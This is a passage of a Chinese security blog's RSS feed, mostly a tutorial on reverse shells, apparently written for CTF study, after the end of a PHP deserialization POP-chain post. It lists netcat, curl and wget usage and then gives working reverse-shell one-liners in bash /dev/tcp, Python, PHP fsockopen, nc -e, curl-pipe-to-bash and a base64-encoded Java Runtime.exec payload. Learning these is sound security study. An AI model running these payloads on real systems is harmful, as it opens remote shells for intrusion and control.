class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$d&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;Room&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; -&amp;gt; name = &lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$b&lt;/span&gt; -&amp;gt; file[&lt;span class=&#34;string&#34;&gt;&amp;#x27;filename&amp;#x27;&lt;/span&gt;] = &lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$c&lt;/span&gt; -&amp;gt; a = &lt;span class=&#34;variable&#34;&gt;$d&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;urlencode&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/div&gt;
&lt;p&gt;在构建 pop 链时，除 &lt;code&gt;__construct&lt;/code&gt;  函数一般不需要写出，   变量的权限与源码保持一致，在串联对象时，需要与源码的对应关系保持一致，比如： &lt;code&gt;$b -&amp;gt; file[&#39;filename&#39;] = $c;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;————END————&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">http://example.com/2024/04/09/Reverse-shell/</guid>
            <title>Reverse shell</title>
            <link>http://example.com/2024/04/09/Reverse-shell/</link>
            <pubDate>Tue, 09 Apr 2024 12:29:05 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h1&gt;
&lt;h2 id=&#34;反弹shell-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell-2&#34;&gt;#&lt;/a&gt; 反弹 shell&lt;/h2&gt;
&lt;h3 id=&#34;linux环境下常用网络工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux环境下常用网络工具&#34;&gt;#&lt;/a&gt; linux 环境下常用网络工具&lt;/h3&gt;
&lt;h4 id=&#34;ncnetcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ncnetcat&#34;&gt;#&lt;/a&gt; nc(netcat)&lt;/h4&gt;
&lt;p&gt;参数说明&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nc.exe -h 即可看到各参数的使用方法。
基本格式：nc [-options] hostname port[s] [ports] ...
		nc -l -p port [options] [hostname] [port]
-d          后台模式
-e          程序重定向，一旦连接，就执行 [危险!!]
-g gateway  source-routing hop point[s], up to 8    设置路由器跃程通信网关，最多可设置8个。
-G num      source-routing pointer: 4, 8, 12, ...   设置来源路由指向器，其数值为4的倍数。
-h          帮助信息
-i secs     延时的间隔
-l          监听模式，用于入站连接 (监听本地端口)
-L          连接关闭后,仍然继续监听
-n          指定数字的IP地址，不能用hostname。即直接使用IP地址，而不通过域名服务器。
-o file     指定文件名称，把往来传输的数据以16进制字码倾倒成该文件保存。
-p port     本地端口号 (指定本地端口 )
-r          随机本地及远程端口
-s addr     本地源地址
-t          使用TELNET交互方式(用telnet来回应 )
-u          UDP模式
-v          详细输出--用两个-v( -vv)可得到更详细的内容. 获得端口信息
-w secs     timeout的时间
-z          将输入输出关掉--只用于扫描. 端口的表示方法可写为M-N的范围格式。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;连接远程主机&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc -nvv Target_ip Target_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;监听本地主机&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc -l -p Local_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;端口扫描&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc -v Target_ip Target_port #可指定范围&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;端口监听&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc -l -p Local_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;远程文件传输&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;nc Target_ip Target_port &amp;lt; Target_File&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;模拟 HTTP headers&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;[root@hatest1 ~]# nc www.linuxfly.org 80 GET / HTTP/1.1 Host: ispconfig.org Referrer: mypage.com User-Agent: my-browser
HTTP/1.1 200 OK Date: Tue, 16 Dec 2008 07:23:24 GMT Server: Apache/2.2.6 (Unix) DAV/2 mod_mono/1.2.1 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.2 Perl/v5.8.8 Set-Cookie: PHPSESSID=bbadorbvie1gn037iih6lrdg50; path=/ Expires: 0 Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Cache-Control: private, post-check=0, pre-check=0, max-age=0 Set-Cookie: oWn_sid=xRutAY; expires=Tue, 23-Dec-2008 07:23:24 GMT; path=/ Vary: Accept-Encoding Transfer-Encoding: chunked Content-Type: text/html [......]

echo -n &amp;quot;GET / HTTP/1.0&amp;quot;r&amp;quot;n&amp;quot;r&amp;quot;n&amp;quot; | nc host.example.com 80
连接到主机并执行
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;正向 shell，反向 shell&lt;/p&gt;
&lt;h4 id=&#34;curl&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl&#34;&gt;#&lt;/a&gt; curl&lt;/h4&gt;
&lt;p&gt;HTTP 命令行工具，支持文件的上传和下载，是综合传输工具&lt;/p&gt;
&lt;p&gt;发送 GET 请求&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;curl URL?a=1&amp;amp;b=nihao&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;发送 POST 请求&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;curl -X POST -d &#39;a=1&amp;amp;b=nihao&#39; URL&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;发送 json 格式请求&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;curl -H &amp;quot;Content-type: application?json&amp;quot; -X POST -d &#39;&amp;#123;&amp;quot;abc&amp;quot;:123.&amp;quot;bcd&amp;quot;:&amp;quot;nihao&amp;quot;&amp;#125;&#39; URL&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;​	 &lt;code&gt;curl -H &amp;quot;Content-Type: application/json&amp;quot; -X POST -d @test.json URL&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;1-下载option-o或者option-o&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1-下载option-o或者option-o&#34;&gt;#&lt;/a&gt; 1、下载 (option:-o 或者 option:-O)&lt;/h5&gt;
&lt;p&gt;1.1、下载页面：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -o dodo1.jpg http:www.linux.com/dodo1.JPG&lt;/code&gt; &lt;br&gt;
# 要注意 - O 这里后面的 url 要具体到某个文件，不然抓不下来&lt;br&gt;
 &lt;code&gt;curl -O http://www.linux.com/dodo1.JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.2：循环下载&lt;br&gt;
有时候下载图片可以能是前面的部分名称是一样的，就最后的尾椎名不一样。这样就会把 dodo1，dodo2，dodo3，dodo4，dodo5 全部保存下来&lt;br&gt;
 &lt;code&gt;curl -O http://www.linux.com/dodo[1-5].JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.3：下载重命名&lt;br&gt;
在 hello/dodo1.JPG 的文件下载下来就会变成 hello_dodo1.JPG, 其他文件依此类推，从而有效的避免了文件被覆盖&lt;br&gt;
 &lt;code&gt;curl -o #1_#2.JPG http://www.linux.com/&amp;#123;hello,bb&amp;#125;/dodo[1-5].JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;由于下载的 hello 与 bb 中的文件名都是 dodo1，dodo2，dodo3，dodo4，dodo5。因此第二次下载的会把第一次下载的覆盖，这样就需要对文件进行重命名。&lt;br&gt;
 &lt;code&gt;curl -O http://www.linux.com/&amp;#123;hello,bb&amp;#125;/dodo[1-5].JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.4：分块下载 (option：-r)&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl -r 0-100 -o dodo1_part1.JPG http://www.linux.com/dodo1.JPG curl -r 100-200 -o dodo1_part2.JPG http://www.linux.com/dodo1.JPG curl -r 200- -o dodo1_part3.JPG http://www.linux.com/dodo1.JPG&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;cat dodo1_part* &amp;gt; dodo1.JPG &lt;/code&gt;&lt;/p&gt;
&lt;p&gt;#这样就可以查看 dodo1.JPG 的内容了&lt;/p&gt;
&lt;p&gt;1.5：通过 ftp（文件传输协议）下载文件 (option：-u)&lt;br&gt;
 curl 可以通过 ftp 下载文件，curl 提供两种从 ftp 中下载的语法&lt;br&gt;
 &lt;code&gt;curl -O -u 用户名:密码 ftp://www.linux.com/dodo1.JPG&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;curl -O ftp://用户名:密码@www.linux.com/dodo1.JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.6: 下载，显示进度条 (option：-#) 或不显示进度条 (option：-s)&lt;br&gt;
 &lt;code&gt;curl -# -O http://www.linux.com/dodo1.JPG  &lt;/code&gt; &lt;br&gt;
 &lt;code&gt;curl -s -O http://www.linux.com/dodo1.JPG&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;1.7、下载，断点续传 (-C &lt;offset&gt;)&lt;br&gt;
 断点续转，从文件头的指定位置开始继续下载 / 上传；offset 续传开始的位置，如果 offset 值为 “-”，curl 会自动从文件中识别起始位置开始传输；&lt;br&gt;
 &lt;code&gt;curl -# -o centos6.8.iso -C - http://mirrors.aliyun.com/centos/6.8/isos/x86_64/CentOS-6.8-x86_64-minimal.iso&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;curl -C -O http://www.linux.com/dodo1.JPG&lt;/code&gt;&lt;/offset&gt;&lt;/p&gt;
&lt;h5 id=&#34;2-上传文件option-t&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2-上传文件option-t&#34;&gt;#&lt;/a&gt; 2、上传文件 (option:-T)&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;curl -T dodo1.JPG -u 用户名:密码 ftp://www.linux.com/img/&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;3-伪造来源页面伪造referer盗链-option-e&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3-伪造来源页面伪造referer盗链-option-e&#34;&gt;#&lt;/a&gt; 3、伪造来源页面 | 伪造 referer | 盗链 (option：-e)&lt;/h5&gt;
&lt;p&gt;很多服务器会检查 http 访问的 referer 从而来控制访问。比如：你是先访问首页，然后再访问首页中的邮箱页面，这里访问邮箱的 referer 地址就是访问首页成功后的页面地址，如果服务器发现对邮箱页面访问的 referer 地址不是首页的地址，就断定那是个盗连了&lt;br&gt;
 #这样就会让服务器其以为你是从 www.linux.com 点击某个链接过来的&lt;br&gt;
 &lt;code&gt;curl -e &amp;quot;www.linux.com&amp;quot; http://mail.linux.com&lt;/code&gt; &lt;br&gt;
# 告诉爱 E 族，我是从百度来的&lt;br&gt;
 &lt;code&gt;curl -e http://baidu.com http://aiezu.com&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;4-伪造代理设备模仿浏览器&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4-伪造代理设备模仿浏览器&#34;&gt;#&lt;/a&gt; 4、伪造代理设备 (模仿浏览器)&lt;/h5&gt;
&lt;p&gt;有些网站需要使用特定的浏览器去访问他们，有些还需要使用某些特定的版本。curl 内置 option:-A 可以让我们指定浏览器去访问网站&lt;br&gt;
 &lt;code&gt;curl -A &amp;quot;Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.0)&amp;quot; http://www.linux.com&lt;/code&gt; &lt;br&gt;
# 告诉爱 E 族，我是 GOOGLE 爬虫蜘蛛（其实我是 curl 命令）&lt;br&gt;
 &lt;code&gt;curl -A &amp;quot; Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&amp;quot; http://aiezu.com&lt;/code&gt; &lt;br&gt;
# 告诉爱 E 族，我用的是微信内置浏览器&lt;br&gt;
 &lt;code&gt;curl -A &amp;quot;Mozilla/5.0 AppleWebKit/600 Mobile MicroMessenger/6.0&amp;quot; http://aiezu.com&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;5-设置http请求&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5-设置http请求&#34;&gt;#&lt;/a&gt; 5、设置 http 请求&lt;/h5&gt;
&lt;p&gt;5.1、设置 http 请求头 (或 option:-H 或 option:–head)&lt;br&gt;
 &lt;code&gt;curl -H &amp;quot;Cache-Control:no-cache&amp;quot;  http://aiezu.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;5.2、指定 proxy 服务器以及其端口 (option::-x)&lt;br&gt;
# 很多时候上网需要用到代理服务器 (比如是使用代理服务器上网或者因为使用 curl 别人网站而被别人屏蔽 IP 地址的时候)，幸运的是 curl 通过使用内置 option：-x 来支持设置代理&lt;br&gt;
 &lt;code&gt;curl -x 192.168.100.100:1080 http://www.linux.com&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;6-http响应头&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6-http响应头&#34;&gt;#&lt;/a&gt; 6、http 响应头&lt;/h5&gt;
&lt;p&gt;6.1、查看 http 响应头 (option:-I)&lt;br&gt;
# 看看本站的 http 头是怎么样的&lt;br&gt;
 &lt;code&gt;curl -I  http://aiezu.com&lt;/code&gt; &lt;br&gt;
 输出：&lt;br&gt;
HTTP/1.1 200 OK&lt;br&gt;
Date: Fri, 25 Nov 2016 16:45:49 GMT&lt;br&gt;
Server: Apache&lt;br&gt;
Set-Cookie: rox__Session=abdrt8vesprhnpc3f63p1df7j4; path=/&lt;br&gt;
Expires: Thu, 19 Nov 1981 08:52:00 GMT&lt;br&gt;
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0&lt;br&gt;
Pragma: no-cache&lt;br&gt;
Vary: Accept-Encoding&lt;br&gt;
Content-Type: text/html; charset=utf-8&lt;/p&gt;
&lt;p&gt;6.2、保存 http 的 response 里面的 header 信息 (option:-D)&lt;br&gt;
 &lt;code&gt;curl -D cookied.txt http://www.linux.com&lt;/code&gt; &lt;br&gt;
 执行后 cookie 信息就被存到了 cookied.txt 里面了&lt;br&gt;
注意：-c (小写) 产生的 cookie 和 - D 里面的 cookie 是不一样的。&lt;/p&gt;
&lt;h5 id=&#34;7-发送表单数据&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7-发送表单数据&#34;&gt;#&lt;/a&gt; 7、发送表单数据&lt;/h5&gt;
&lt;p&gt;&lt;code&gt;curl -F &amp;quot;pic=@logo.png&amp;quot; -F &amp;quot;site=aiezu&amp;quot;  http://aiezu.com/&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;8-cookie&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8-cookie&#34;&gt;#&lt;/a&gt; 8、cookie&lt;/h5&gt;
&lt;p&gt;8.1、发送 cookie (option:-b）&lt;br&gt;
# 有些网站是使用 cookie 来记录 session 信息。对于 chrome 这样的浏览器，可以轻易处理 cookie 信息，但在 curl 中只要增加相关参数也是可以很容易的处理 cookie&lt;br&gt;
 &lt;code&gt;curl -b &amp;quot;domain=aiezu.com&amp;quot;  http://aiezu.com&lt;/code&gt; &lt;br&gt;
# 很多网站都是通过监视你的 cookie 信息来判断你是否按规矩访问他们的网站的，因此我们需要使用保存的 cookie 信息。内置 option: -b&lt;br&gt;
 &lt;code&gt;curl -b cookiec.txt http://www.linux.com&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;8.2、保存 http 的 response 里面的 cookie 信息 (option:-c）&lt;br&gt;
执行后 http 的 response 里面的 cookie 信息就被存到了 cookiec.txt 里面了&lt;br&gt;
 &lt;code&gt;curl -c cookiec.txt  http://www.linux.com&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;wget&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wget&#34;&gt;#&lt;/a&gt; wget&lt;/h4&gt;
&lt;p&gt;wget 是一个下载文件的工具，它用在命令行下。对于 Linux 用户是必不可少的工具，我们经常要下载一些软件或从远程服务器恢复备份到本地服务器。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;wget URL&lt;/code&gt;&lt;/p&gt;
&lt;h5 id=&#34;与curl区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#与curl区别&#34;&gt;#&lt;/a&gt; 与 curl 区别&lt;/h5&gt;
&lt;p&gt;wget 是个专职的下载利器，简单，专一，极致；而 curl 可以下载，但是长项不在于下载，而在于模拟提交 web 数据，POST/GET 请求，调试网页，等等。在下载上，也各有所长，wget 可以递归，支持断点；而 curl 支持 URL 中加入变量，因此可以批量下载。个人用途上，我经常用 wget 来下载文件，加 -c 选项不怕断网；使用 curl 来跟网站的 API 交互，简便清晰。&lt;/p&gt;
&lt;h4 id=&#34;ping&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ping&#34;&gt;#&lt;/a&gt; ping&lt;/h4&gt;
&lt;p&gt;ping 命令本身处于应用层，相当于一个应用程序，它直接使用网络层的 ICMP 协议，ping 用来检查网络是否通畅或者网络连接速度的命令。&lt;/p&gt;
&lt;h4 id=&#34;talent&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#talent&#34;&gt;#&lt;/a&gt; talent&lt;/h4&gt;
&lt;p&gt;telnet 协议是 TCP/IP 协议族的其中之一，是 Internet 远端登录服务的标准协议和主要方式，常用于网页服务器的远端控制，可供使用者在本地主机执行远端主机上的工作。telnet 通常是用来探测指定 ip 是否开放指定端口。&lt;/p&gt;
&lt;p&gt;open : 使用 openhostname 可以建立到主机的 Telnet 连接。&lt;/p&gt;
&lt;p&gt;close : 使用命令 close 命令可以关闭现有的 Telnet 连接。&lt;/p&gt;
&lt;p&gt;display : 使用 display 命令可以查看 Telnet 客户端的当前设置。&lt;/p&gt;
&lt;p&gt;send : 使用 send 命令可以向 Telnet 服务器发送命令。支持以下命令：&lt;/p&gt;
&lt;p&gt;ao : 放弃输出命令。&lt;/p&gt;
&lt;p&gt;ayt : “Are you there” 命令。&lt;/p&gt;
&lt;p&gt;esc : 发送当前的转义字符。&lt;/p&gt;
&lt;p&gt;ip : 中断进程命令。&lt;/p&gt;
&lt;p&gt;synch : 执行 Telnet 同步操作。&lt;/p&gt;
&lt;p&gt;brk : 发送信号。quit ：使用 quit 命令可以退出 Telnet 客户端。&lt;/p&gt;
&lt;h4 id=&#34;ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh&#34;&gt;#&lt;/a&gt; ssh&lt;/h4&gt;
&lt;p&gt;简单来说，ssh 和 telnet 是实现相同的功能，ssh 中 数据是经过加密的，是安全的，而 Telnet 是明文传输的，ssh 是加密的，基于 SSL 。&lt;/p&gt;
&lt;h3 id=&#34;正向shell如何连接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#正向shell如何连接&#34;&gt;#&lt;/a&gt; 正向 shell 如何连接&lt;/h3&gt;
&lt;p&gt;假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。&lt;/p&gt;
&lt;p&gt;目标主机： &lt;code&gt;nc -lvp Target_port -e /bin/sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/BuPk7DwXMoHmEl3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;本地主机：  &lt;code&gt;nc Target_ip Target_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img lazyload src=&#34;/images/loading.svg&#34; data-src=&#34;https://s2.loli.net/2024/04/09/a9okGwVWhypUD4m.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;什么是反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#什么是反弹shell&#34;&gt;#&lt;/a&gt; 什么是反弹 shell&lt;/h3&gt;
&lt;p&gt;参考：&lt;a class=&#34;link&#34; href=&#34;https://xz.aliyun.com/t/9488&#34;&gt;https://xz.aliyun.com/t/9488 &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;反弹 shell（reverse shell），就是控制端监听在某 TCP/UDP 端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell 与 telnet，ssh 等标准 shell 对应，本质上是网络概念的客户端与服务端的角色反转。&lt;/p&gt;
&lt;p&gt;举例：假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。那么什么情况下正向连接不能用了呢？&lt;/p&gt;
&lt;p&gt;有如下情况：&lt;/p&gt;
&lt;p&gt;1. 某客户机中了你的网马，但是它在局域网内，你直接连接不了。&lt;/p&gt;
&lt;p&gt;2. 目标机器的 ip 动态改变，你不能持续控制。&lt;/p&gt;
&lt;p&gt;3. 由于防火墙等限制，对方机器只能发送请求，不能接收请求。&lt;/p&gt;
&lt;p&gt;4. 对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机等情况都是未知的，所以建立一个服务端让恶意程序主动连接，才是上策。&lt;/p&gt;
&lt;p&gt;那么反弹就很好理解了，攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接。&lt;/p&gt;
&lt;p&gt;反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。&lt;/p&gt;
&lt;h3 id=&#34;反弹shell的方式&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#反弹shell的方式&#34;&gt;#&lt;/a&gt; 反弹 shell 的方式&lt;/h3&gt;
&lt;h4 id=&#34;netcat&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#netcat&#34;&gt;#&lt;/a&gt; netcat&lt;/h4&gt;
&lt;p&gt;攻击机开启监听：  &lt;code&gt;nc -lvp Target_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;-lvp：l 监听，v 输出交互过程，p 端口&lt;/p&gt;
&lt;p&gt;靶机连接攻击机：  &lt;code&gt;nc Target_ip Target_port -e /bin/bash&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;bash&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#bash&#34;&gt;#&lt;/a&gt; bash&lt;/h4&gt;
&lt;p&gt;Bash 反弹 shell 的方法非常好用，题目的服务器环境可能没有 nc, 但是一定会有 bash&lt;/p&gt;
&lt;p&gt;同样的我们还是用 nc -lvp Target_Port 在攻击机的端口开启监听&lt;/p&gt;
&lt;p&gt;&lt;code&gt;nc -lvp Target_Port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这次我们使用 Bash 结合重定向来反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/Target_ip/Target_port 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;或者  &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/Target_ip/Target_port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;推荐使用后者，使用前者弹 shell, 当命令在服务端 shell 中执行时可能存在 /bin/sh 的软连接并不指向 bash 的问题，导致报错 &lt;code&gt;/bin/sh: 1:Syntax error:Bad fd number&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;bash -i 产生 bash 交互环境 &amp;gt;&amp;amp; 将联合符号前后内容结合，重定向给后者，/dev/tcp/Target_IP/Target_Port 让目标主机发起与攻击机在 Target_Port 上的 TCP 连接，0&amp;gt;&amp;amp;1 将标准输入和标准输出的内容相结合，重定向给前面标准输出的内容。&lt;/p&gt;
&lt;p&gt;Bash 产生了一个交互环境和本地主机主动发起与攻击机端口建立的连接相结合，然后在重定向个 TCP 会话连接，最后将用户键盘输入与用户标准输出相结合再次重定向给一个标准的输出，即得到一个 Bash 反弹环境。&lt;/p&gt;
&lt;p&gt;[关于上述 bash 命令的详细解释](&lt;a class=&#34;link&#34; href=&#34;https://www.cnblogs.com/pandana/p/16289320.html&#34;&gt;反弹 bash shell 命令详解 - pandaes - 博客园 (cnblogs.com) &lt;i class=&#34;fa-regular fa-arrow-up-right-from-square fa-sm&#34;&gt;&lt;/i&gt;&lt;/a&gt;)&lt;/p&gt;
&lt;h4 id=&#34;pythion反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pythion反弹shell&#34;&gt;#&lt;/a&gt; Pythion 反弹 shell&lt;/h4&gt;
&lt;p&gt;同样的我们还是在攻击机开始端口监听， &lt;code&gt;nc -lvp Target_Port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;在靶机上执行 &lt;code&gt;python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&amp;quot;Target_IP&amp;quot;,Target_Port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&amp;quot;/bin/sh&amp;quot;,&amp;quot;-i&amp;quot;]);&#39;&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;curl反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#curl反弹shell&#34;&gt;#&lt;/a&gt; curl 反弹 shell&lt;/h4&gt;
&lt;p&gt;简单来说就是将 Bash 重定向这一句内容写入文件，让靶机用 curl 下载这个文件并且执行，达到用 Bash 重定向相同的效果&lt;/p&gt;
&lt;p&gt;首先，在攻击者 vps 的 web 目录里面创建一个 index 文件（index.php 或 index.html），内容如下：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/Target_IP/Target_Port 0&amp;gt;&amp;amp;1&lt;/code&gt;  或者 &lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/Target_IP/Target_Port 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt; ，而 java 的 RCE 需要用 base64 编码，Payload: &lt;code&gt;Runtime.getRuntime().exec(&amp;quot;bash -c &amp;#123;echo,YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS84ODg4IDA+JjE=&amp;#125;|&amp;#123;base64,-d&amp;#125;|&amp;#123;bash,-i&amp;#125;&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后在目标机上执行如下，即可反弹 shell&lt;/p&gt;
&lt;p&gt;&lt;code&gt;curl Target_IP|bash&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;php反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php反弹shell&#34;&gt;#&lt;/a&gt; php 反弹 shell&lt;/h4&gt;
&lt;p&gt;攻击机：  &lt;code&gt;nc -nvlp Target_port&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;靶机：  &lt;code&gt;php -r &#39;$sock=fsockopen(&amp;quot;192.168.37.131&amp;quot;,1234);     exec(&amp;quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;h4 id=&#34;others&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#others&#34;&gt;#&lt;/a&gt; &lt;strong&gt;Others&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;反弹 shell 的方式很多，nc 和 bash 是比较常见的方式，其他还有 Telnet，Socat 等工具可以反弹 shell，或者写个 python，php 等脚本也可以反弹 shell，比较琐碎的内容具体遇到了再查即可。&lt;/p&gt;
